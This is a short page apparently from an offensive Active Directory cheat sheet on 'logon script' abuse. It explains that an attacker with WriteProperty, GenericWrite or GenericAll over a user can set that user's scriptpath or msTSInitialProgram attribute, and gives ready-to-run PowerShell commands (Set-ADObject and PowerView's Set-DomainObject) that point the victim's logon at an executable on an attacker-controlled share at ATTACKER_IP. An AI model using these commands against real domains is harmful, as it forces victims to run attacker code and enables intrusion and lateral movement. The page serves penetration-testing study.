# Logon script

This abuse can be carried out when controlling an object that has `WriteProperty`, `GenericWrite` or `GenericAll` over a target user.

The attacker can make the user execute a custom script at logon. This can be achieved with the Active Directory PowerShell module or with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# With Set-ADObject (Active Directory module)
Set-ADObject -SamAccountName 'user' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\run_at_logon.exe"

# With Set-DomainObject (PowerView module)
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\ATTACKER_IP\run_at_logon.exe'} -Verbose
```

